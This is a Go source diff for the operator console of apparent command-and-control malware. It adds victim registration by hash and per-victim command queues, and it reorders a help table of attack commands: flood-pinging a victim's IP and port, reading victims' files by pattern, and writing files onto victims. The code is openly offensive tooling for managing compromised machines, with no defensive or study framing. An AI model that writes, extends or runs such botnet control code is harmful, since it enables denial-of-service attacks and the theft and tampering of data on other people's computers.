@@ -2,14 +2,19 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"runtime"
 	"strings"
 	"time"
 
+	rbt "github.com/emirpasic/gods/trees/redblacktree"
 	"github.com/olekukonko/tablewriter"
 )
+
+// Setup for Red and Black Tree
+var clientTree = rbt.NewWithStringComparator()
 
 // menu banner
 func displayMenu() {
@@ -94,11 +99,13 @@ func specificHelp(params ...interface{}) {
 	table.Append([]string{"", "", ""})
 	table.Append([]string{"/list", "None", "Curently still in progress"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/floodping", "IP, Port", "floodping for victim"})
+	table.Append([]string{"/supercatfile", "Hash", "Showing the supercat of a hash"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/supercat", "file pattern", "cats victims file"})
+	table.Append([]string{"/floodping", "Hash, IP, Port", "floodping for victim"})
 	table.Append([]string{"", "", ""})
-	table.Append([]string{"/writefile", "file", "write a file to the vicitim"})
+	table.Append([]string{"/supercat", "Hash, file pattern", "cats victims file"})
+	table.Append([]string{"", "", ""})
+	table.Append([]string{"/writefile", "Hash, file", "write a file to the vicitim"})
 
 	// Render the table
 	table.Render()
@@ -116,14 +123,13 @@ func CallClear(params ...interface{}) {
 	}
 }
 
-
-func printlNDebug(input string){
-	if(globalDEBUG){
-		println( "DEBUG::" + input)
+func printlNDebug(input string) {
+	if globalDEBUG {
+		println("DEBUG::" + input)
 	}
 }
 
-//FREDY implement this given a incoming string 
+//FREDY implement this given a incoming string
 /* SHOULD BE JSON OF THIS FORM USE UNMARSHALL
 type IncomingClientRegistration struct {
 	Hash string
@@ -131,8 +137,41 @@ type IncomingClientRegistration struct {
 
 }
 */
-func registerNewClient(incomingJson string){
-	
-    err := json.Unmarshal([]byte(incomingJson), &client)
+func registerNewClient(incomingJson string) {
 
+	var client IncomingVictimRequest
+
+	err := json.Unmarshal([]byte(incomingJson), &client)
+	if err != nil {
+		fmt.Println("Failed to parse client registration JSON:", err)
+		return
+	}
+
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+	// in case if client already exists
+	if _, exists := clientTree.Get(client.RequesterHash); !exists {
+		victim := VictimInfo{
+			Hash:     client.RequesterHash,
+			Commands: []VictimCommand{},
+		}
+		clientTree.Put(client.RequesterHash, victim)
+		fmt.Println("Registered new client with hash:", client.RequesterHash)
+	}
+
+}
+
+func AddCommandToVictim(hash string, command VictimCommand) {
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	val, found := clientTree.Get(hash)
+	if found {
+		victim := val.(VictimInfo)
+		victim.Commands = append(victim.Commands, command)
+		clientTree.Put(hash, victim)
+		fmt.Println("Added command to victim:", hash)
+	} else {
+		fmt.Println("Victim not found:", hash)
+	}
 }
